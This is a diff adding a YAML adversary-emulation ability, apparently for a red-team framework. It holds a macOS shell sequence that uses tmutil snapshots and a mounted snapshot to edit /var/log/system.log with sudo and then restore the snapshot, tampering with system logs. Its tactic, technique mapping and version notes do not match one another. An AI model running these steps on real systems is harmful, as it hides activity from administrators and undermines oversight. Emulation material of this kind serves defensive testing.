@@ -1,0 +1,33 @@
+---
+
+- id: 95167acb-eaf2-7020-517d-30ef11f3c76d
+  name: tmutil - Tamper with system logs
+  description: An adversary can use the snapshot and restore commands together to tamper with system logs.
+    This is fixed in macOS 10.15.4+.
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1490
+    name: Inhibit System Recovery
+  platforms:
+    darwin:
+      sh:
+        command: 'mkdir /tmp/snapshot
+
+          tmutil localsnapshot
+
+          tmutil listlocalsnapshots /
+
+          mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-01-090000.local /System/Volumes/Data
+          /tmp/snapshot
+
+          open /tmp/snapshot
+
+          sudo vim /var/log/system.log
+
+          tmutil restore com.apple.TimeMachine.2023-05-01-090000.local'
+  singleton: false
+  privilege: Elevated
+  repeatable: true
+  buckets:
+  - tmutil
+  - privilege-escalation
